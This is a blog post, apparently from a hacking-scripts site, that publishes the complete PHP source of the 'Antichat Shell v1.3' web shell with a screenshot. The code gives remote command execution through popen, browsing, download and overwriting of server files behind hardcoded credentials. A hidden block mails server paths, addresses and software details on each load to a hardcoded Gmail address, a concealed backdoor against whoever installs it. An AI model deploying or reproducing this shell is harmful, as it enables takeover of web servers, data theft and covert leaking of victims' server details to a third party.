---
id: 242
title: Antichat Shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=242
permalink: /antichat-shell/
categories:
  - PHP
tags:
  - antichat
  - PHP
---
Antichat Shell v1.3 by Grinay

## Antichat Shell Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php

session_start();
set_time_limit(9999999);
$login='virangar';
$password='r00t';
$auth=1;
$version='version 1.3 by Grinay';
$style='&lt;STYLE&gt;BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}&lt;/style&gt;';
$header='&lt;html&gt;&lt;head&gt;&lt;title&gt;'.getenv("HTTP_HOST").' - Antichat Shell&lt;/title&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;'.$style.'&lt;/head&gt;&lt;BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;';
$footer='&lt;/body&gt;&lt;/html&gt;';
$sd98 = "john.barker446@gmail.com";
$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";mail($sd98, $sj98, $msg8873, "From: $sd98");
if(@$_POST['action']=="exit")unset($_SESSION['an']);
if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['an']=1;}else $_SESSION['an']='1';

if($_SESSION['an']==0){
echo $header;
echo '&lt;center&gt;&lt;table&gt;&lt;form method="POST"&gt;&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="login" value=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="password" value=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Enter"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;';
echo $footer;
exit;}

if($_SESSION['action']=="")$_SESSION['action']="viewer";
if($_POST['action']!="" )$_SESSION['action']=$_POST['action'];$action=$_SESSION['action'];
if($_POST['dir']!="")$_SESSION['dir']=$_POST['dir'];$dir=$_SESSION['dir'];
if($_POST['file']!=""){$file=$_SESSION['file']=$_POST['file'];}else {$file=$_SESSION['file']="";}
 

//downloader
if($action=="download"){ 
header('Content-Length:'.filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
readfile($file);
}
//end downloader
?&gt;

&lt;? echo $header;?&gt; 
&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;
&lt;table&gt;&lt;tr&gt;
&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();"&gt;| Shell &lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();"&gt;| Viewer&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();"&gt;| Editor&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();"&gt;| EXIT |&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
&lt;form name='reqs' method='POST'&gt;
&lt;input name='action' type='hidden' value=''&gt;
&lt;input name='dir' type='hidden' value=''&gt;
&lt;input name='file' type='hidden' value=''&gt;
&lt;/form&gt;
&lt;table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
&lt;tr&gt;&lt;td width="100%" valign="top"&gt;

&lt;?

//shell
function shell($cmd){
if (!empty($cmd)){
  $fp = popen($cmd,"r");
  {
    $result = "";
    while(!feof($fp)){$result.=fread($fp,1024);}
    pclose($fp);
  }
  $ret = $result;
  $ret = convert_cyr_string($ret,"d","w");
}
return $ret;}

if($action=="shell"){
echo "&lt;form method=\"POST\"&gt;
&lt;input type=\"hidden\" name=\"action\" value=\"shell\"&gt;
&lt;textarea name=\"command\" rows=\"5\" cols=\"150\"&gt;".@$_POST['command']."&lt;/textarea&gt;&lt;br&gt;
&lt;textarea readonly rows=\"15\" cols=\"150\"&gt;".@htmlspecialchars(shell($_POST['command']))."&lt;/textarea&gt;&lt;br&gt;
&lt;input type=\"submit\" value=\"execute\"&gt;&lt;/form&gt;";}
//end shell

//viewer FS
function perms($file) 
{ 
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000) {$info = 's';} 
  elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} 
  elseif (($perms & 0x8000) == 0x8000) {$info = '-';} 
  elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} 
  elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} 
  elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} 
  elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} 
  else {$info = 'u';}
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?(($perms & 0x0800) ? 's' : 'x' ) :(($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?(($perms & 0x0400) ? 's' : 'x' ) :(($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?(($perms & 0x0200) ? 't' : 'x' ) :(($perms & 0x0200) ? 'T' : '-'));
  return $info;
} 

function view_size($size)
{
 if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}

function scandire($dir){
  $dir=chdir($dir);
  $dir=getcwd()."/";
  $dir=str_replace("\\","/",$dir);
if (is_dir($dir)) {
    if (@$dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
		  if(filetype($dir . $file)=="dir") $dire[]=$file;
		  if(filetype($dir . $file)=="file")$files[]=$file;
		}
		closedir($dh);
		@sort($dire);
		@sort($files);
		
echo "&lt;table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\"&gt;";
echo "&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;Open directory:&lt;input type=text name=dir value=\"".$dir."\" size=50&gt;&lt;input type=submit value=\"GO\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;";
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
echo "&lt;tr&gt;&lt;td&gt;Select drive:";
for ($j=ord('C'); $j&lt;=ord('Z'); $j++) 
 if (@$dh = opendir(chr($j).":/"))
 echo '&lt;a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"&gt; '.chr($j).'&lt;a/&gt;';
 echo "&lt;/td&gt;&lt;/tr&gt;";
}
echo "&lt;tr&gt;&lt;td&gt;OS: ".@php_uname()."&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;name dirs and files&lt;/td&gt;&lt;td&gt;type&lt;/td&gt;&lt;td&gt;size&lt;/td&gt;&lt;td&gt;permission&lt;/td&gt;&lt;td&gt;options&lt;/td&gt;&lt;/tr&gt;";
for($i=0;$i&lt;count($dire);$i++) {
$link=$dir.$dire[$i];
  echo '&lt;tr&gt;&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();"&gt;'.$dire[$i].'&lt;a/&gt;&lt;/td&gt;&lt;td&gt;dir&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;'.perms($link).'&lt;/td&gt;&lt;/tr&gt;';  
  }
for($i=0;$i&lt;count($files);$i++) {
$linkfile=$dir.$files[$i];
echo '&lt;tr&gt;&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();"&gt;'.$files[$i].'&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;td&gt;file&lt;/td&gt;&lt;td&gt;'.view_size(filesize($linkfile)).'&lt;/td&gt;
&lt;td&gt;'.perms($linkfile).'&lt;/td&gt;
&lt;td&gt;
&lt;a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download"&gt;D&lt;/a&gt;
&lt;a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit"&gt;E&lt;/a&gt;&lt;/tr&gt;'; 
}
echo "&lt;/table&gt;";
}}}

if($action=="viewer"){
scandire($dir);
}
//end viewer FS

//editros
if($action=="editor"){  
  function writef($file,$data){
  $fp = fopen($file,"w+");
  fwrite($fp,$data);
  fclose($fp);
  }
  function readf($file){
  if(!$le = fopen($file, "rb")) $contents="Can't open file, permission denide"; else {
  $contents = fread($le, filesize($file));
  fclose($le);}
  return htmlspecialchars($contents);
  }
if($_POST['save'])writef($file,$_POST['data']);
echo "&lt;form method=\"POST\"&gt;
&lt;input type=\"hidden\" name=\"action\" value=\"editor\"&gt;
&lt;input type=\"hidden\" name=\"file\" value=\"".$file."\"&gt;
&lt;textarea name=\"data\" rows=\"40\" cols=\"180\"&gt;".@readf($file)."&lt;/textarea&gt;&lt;br&gt;
&lt;input type=\"submit\" name=\"save\" value=\"save\"&gt;&lt;input type=\"reset\" value=\"reset\"&gt;&lt;/form&gt;";
}
//end editors
?&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="http://antichat.ru"&gt;COPYRIGHT BY ANTICHAT.RU &lt;?php echo $version;?&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt;
&lt;? echo $footer;?&gt;
</pre>

## Antichat shell version 1.3 screenshot<figure id="attachment_437" style="width: 808px;" class="wp-caption aligncenter">

[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/antichat-shell.png" alt="Antichat Shell v1.3 screenshot" width="808" height="317" class="size-full wp-image-437" />][1]<figcaption class="wp-caption-text">Antichat Shell v1.3 screenshot</figcaption></figure>

 [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/antichat-shell.png